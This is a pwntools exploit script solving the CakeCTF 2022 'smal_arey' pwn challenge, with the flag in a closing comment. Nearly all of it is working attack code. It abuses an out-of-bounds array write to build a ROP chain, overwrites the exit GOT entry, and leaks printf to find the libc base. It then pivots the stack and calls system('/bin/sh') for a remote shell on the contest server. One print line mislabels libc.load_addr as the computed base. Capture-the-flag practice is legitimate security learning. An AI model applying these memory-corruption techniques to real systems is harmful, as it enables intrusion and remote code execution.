from pwn import *
import struct

context.terminal = ['tmux', 'split-w', '-h']


binpath = './smal_arey/chall'
libcpath = './smal_arey/libc-2.31.so'
elf = ELF(binpath)
# libc = elf.libc
libc = ELF(libcpath)

gdbscript = '''
gef
b *0x401318
# exit and rop
b *0x4012f2
ignore 1 25
set $arr=0x00007fffffffdb20
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = remote('pwn1.2022.cakectf.com', 9002)

io.sendlineafter(b'size: ', b'5')
io.sendlineafter(b'index: ', b'4')
io.sendlineafter(b'value: ', b'1000')

def write_ropchain(rop, offset=0):
    for i, g in enumerate(rop):
        print('(i, g) = ({}, 0x{:x})'.format(offset + i, g))
        io.sendlineafter(b'index: ', b'%d' % (offset + i))
        io.sendlineafter(b'value: ', b'%d' % g)

addr_lu = 0x40200b

addr_data = 0x404000
addr_s = addr_data + 0x800
addr_pivot = addr_data + 0x700

addr_ret = 0x00401404  # : ret;
addr_pop_rdi = 0x004013e3  # : pop rdi; ret;
addr_pop_rsi_r15 = 0x004013e1  # : pop rsi; pop r15; ret;
addr_pop3 = 0x004013de  # : pop r13; pop r14; pop r15; ret;
addr_pop_rsp_pop3 = 0x004013dd  # : pop rsp; pop r13; pop r14; pop r15; ret;

# skip local variables
rop = [
        addr_ret, addr_ret, addr_ret,
        addr_pop3,
        ]
write_ropchain(rop)

rop = [
        # scanf("%lu", addr_s)
        addr_pop_rdi,
        addr_lu,
        addr_pop_rsi_r15,
        addr_s,
        0xdeadbeef,
        elf.plt['__isoc99_scanf'],
        # printf("%s", elf.got['printf'])
        addr_pop_rdi,
        addr_s,
        addr_pop_rsi_r15,
        elf.got['printf'],
        0xdeadbeef,
        elf.plt['printf'],
        # scanf("%s", addr_pivot)
        addr_pop_rdi,
        addr_s,
        addr_pop_rsi_r15,
        addr_pivot,
        0xdeadbeef,
        elf.plt['__isoc99_scanf'],
        # pivot
        addr_pop_rsp_pop3,
        addr_pivot - 3 * 0x8,
        ]
write_ropchain(rop, 7)

# overwrite got and trigger rop
def change_base(new_base):
    io.sendlineafter(b'index: ', b'6')
    io.sendlineafter(b'value: ', b'%d' % new_base)
change_base(elf.got['exit'])
write_ropchain([addr_pop_rdi])
io.sendlineafter(b'index: ', b'-1')

# write "%s" to .data section
io.sendline(b'%d' % (struct.unpack('<q', b"%s\n".ljust(8, b'\x00'))))

# leak libc
data = io.recvline().rstrip()
addr_printf = u64(data.ljust(8, b'\x00'))
addr_libc = addr_printf - libc.symbols['printf']
print('addr_printf = 0x{:x}'.format(addr_printf))
print('addr_libc = 0x{:x}'.format(libc.load_addr))

# 2nd stage rop
payload = b''
payload += p64(addr_pop_rdi)
payload += p64(addr_libc + next(libc.search(b'/bin/sh')))
payload += p64(addr_libc + libc.symbols['system'])
io.sendline(payload)

io.interactive()

# CakeCTF{PRE01-C. Use parentheses within macros around parameter names}
